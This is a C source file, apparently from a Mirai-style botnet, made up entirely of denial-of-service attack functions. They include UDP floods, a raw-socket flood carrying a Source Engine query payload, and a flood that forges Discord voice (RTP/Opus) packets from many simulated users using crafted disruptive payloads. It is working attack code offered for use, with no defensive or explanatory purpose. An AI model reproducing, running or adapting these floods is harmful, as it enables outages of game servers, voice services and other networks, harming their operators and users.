#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>

#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <stdbool.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/table.h"
#include "headers/protocol.h"

#define MAX_SOCKETS 320
#define USERS_TO_SIMULATE 45

#define THREAD_COUNT 200
#define DEFAULT_PACKET_SIZE 1024

#define MAX(a,b) (((a) > (b)) ? (a) : (b))

#define IPV4(a,b,c,d) ((uint32_t)(((a)<<24)|((b)<<16)|((c)<<8)|(d)))

static unsigned long int Q[4096], c = 362436;

void attack_udpflood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1458);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        char *vega_hex[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
        char *data = vega_hex[rand()%256];  

        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_udpbypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);

    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            uint16_t data_len = rand_next_range(700, 1000);
            rand_str(data, data_len);

            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len;

    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        return;
    }

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
#endif
        close(fd);
        return;
    }

    if (sport == 0xffff)
        sport = rand_next() % 65535;
    else
        sport = htons(sport);

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof(uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        udph->check = 0;
        udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct udphdr *udph = (struct udphdr *)(iph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() % (1 << (32 - targs[i].netmask))));

            if (ip_ident == 0xffff)
                iph->id = htons(rand_next() % 65535);
            if (sport == 0xffff)
                udph->source = htons(rand_next() % 65535);
            if (dport == 0xffff)
                udph->dest = htons(rand_next() % 65535);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);

            if (sendto(fd, pkts[i], ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
            {
#ifdef DEBUG
                printf("[DEBUG] sendto failed: %s\n", strerror(errno));
#endif
            }
        }
        usleep(1);
    }
}

void attack_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    int socks[MAX_SOCKETS];
    int active_sockets = 0;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 50001);
    int length = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);

    for (int i = 0; i < MAX_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        active_sockets++;

        int buf_size = 524288;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
        int tos_value = (i % 2 == 0) ? 0xb8 : 0x88;
        setsockopt(socks[i], IPPROTO_IP, IP_TOS, &tos_value, sizeof(int));
        fcntl(socks[i], F_SETFL, O_NONBLOCK);

        struct sockaddr_in src;
        src.sin_family = AF_INET;
        src.sin_port = htons(1024 + (rand_next() % 64000));
        src.sin_addr.s_addr = INADDR_ANY;
        bind(socks[i], (struct sockaddr *)&src, sizeof(src));
    }

    uint8_t discord_opus_pattern[8][16] = {
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x04},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x05}
    };

    uint32_t ssrc_values[targs_len][USERS_TO_SIMULATE];
    uint16_t seq[targs_len][USERS_TO_SIMULATE];
    uint32_t ts[targs_len][USERS_TO_SIMULATE];
    uint32_t base_ts = (uint32_t)time(NULL) * 48000;

    for (int t = 0; t < targs_len; t++) {
        for (int u = 0; u < USERS_TO_SIMULATE; u++) {
            uint8_t first_octet = (ntohl(targs[t].addr) >> 24) & 0xFF;
            bool is_discord_infra = (first_octet == 66);
            ssrc_values[t][u] = is_discord_infra ? (0x12345000 + (rand_next() % 0xFFF)) : (0x10000000 + (rand_next() % 0xEFFFFFFF));
            seq[t][u] = rand_next() % 1000;
            ts[t][u] = base_ts + (t * USERS_TO_SIMULATE + u) * 960;
        }
    }

    uint8_t disruptive_payloads[7][140];
    for (int i = 0; i < 140; i++) {
        disruptive_payloads[0][i] = (i % 4 == 0) ? 0xFC : (i % 4 == 1) ? 0xFF : (i % 4 == 2) ? 0x01 : 0x00;
        disruptive_payloads[1][i] = (i * 17) & 0xFF;
        disruptive_payloads[2][i] = (i < 4) ? ((i == 0) ? 0xF8 : 0xA0) : (i % 2 == 0) ? 0xAA : 0x55;
        disruptive_payloads[3][i] = (i < 10) ? (0x80 + (i % 16)) : (i < 20) ? (0xF0 + (i % 16)) : (((i % 8) < 4) ? 0xCC : 0x33);
        disruptive_payloads[4][i] = (i < 5) ? (0xB8 - i) : (((i * 7) + 13) & 0xFF);
        disruptive_payloads[5][i] = (i < 8) ? ((i == 0) ? 0xFC : (i == 1) ? 0x01 : ((i % 2) ? 0xA0 : 0x50)) : (((i * 13) + (i % 7)) & 0xFF);
        disruptive_payloads[6][i] = (i < 3) ? ((i == 0) ? 0xF8 : (i == 1) ? 0x01 : 0x00) : ((i % 20 < 10) ? (0x40 + (i % 64)) : ((i % 30 == 0) ? 0xFF : 0x10));
    }

    char packet[200];
    int phase = 0;
    int phase_counter = 0;
    struct timespec last_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &last_time);

    int phase_duration[6] = {80, 120, 60, 100, 40, 150};

    while (true) {
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        long elapsed_ms = ((current_time.tv_sec - last_time.tv_sec) * 1000) + 
                          ((current_time.tv_nsec - last_time.tv_nsec) / 1000000);
        phase_counter += elapsed_ms;
        last_time = current_time;

        if (phase_counter >= phase_duration[phase]) {
            phase = (phase + 1) % 6;
            phase_counter = 0;
        }

        int sleep_time = (phase == 0 || phase == 3 || phase == 4) ? 1 : (phase == 1) ? 2 : (phase == 2) ? 4 : 3;
        usleep(sleep_time * 1000);

        int base_bursts = (phase == 0) ? 25 : (phase == 1) ? 18 : (phase == 2) ? 10 : (phase == 3) ? 22 : (phase == 4) ? 24 : 16;

        for (int t = 0; t < targs_len; t++) {
            struct sockaddr_in *sin = &targs[t].sock_addr;
            sin->sin_port = htons(dport);

            uint8_t first_octet = (ntohl(targs[t].addr) >> 24) & 0xFF;
            bool is_discord_infra = (first_octet == 66);
            int packet_size = (length > 0 && length <= 200) ? length : (is_discord_infra ? 160 : 145);

            for (int i = 0; i < active_sockets; i++) {
                if (socks[i] < 0) continue;
                for (int user = 0; user < USERS_TO_SIMULATE; user++) {
                    int pattern_idx = rand_next() % (is_discord_infra ? 8 : 6);
                    int payload_idx = rand_next() % (is_discord_infra ? 7 : 5);

                    memcpy(packet, discord_opus_pattern[pattern_idx], 16);
                    packet[2] = (seq[t][user] >> 8) & 0xFF;
                    packet[3] = seq[t][user] & 0xFF;
                    seq[t][user]++;
                    packet[4] = (ts[t][user] >> 24) & 0xFF;
                    packet[5] = (ts[t][user] >> 16) & 0xFF;
                    packet[6] = (ts[t][user] >> 8) & 0xFF;
                    packet[7] = ts[t][user] & 0xFF;
                    ts[t][user] += 960;
                    packet[8] = (ssrc_values[t][user] >> 24) & 0xFF;
                    packet[9] = (ssrc_values[t][user] >> 16) & 0xFF;
                    packet[10] = (ssrc_values[t][user] >> 8) & 0xFF;
                    packet[11] = ssrc_values[t][user] & 0xFF;
                    size_t copy_size = (packet_size - 16 < 140) ? packet_size - 16 : 140;
                    memcpy(packet + 16, disruptive_payloads[payload_idx], copy_size);

                    int bursts = base_bursts + (user % 5) - 2;
                    if (bursts < 6) bursts = 6;

                    for (int k = 0; k < bursts; k++) {
                        sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, (struct sockaddr *)sin, sizeof(*sin));
                        if (k % 3 == 0) {
                            packet[3] = (seq[t][user] + 1) & 0xFF;
                            packet[7] = (ts[t][user] + 960) & 0xFF;
                            sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, (struct sockaddr *)sin, sizeof(*sin));
                        }
                    }
                }
            }
        }
    }
}
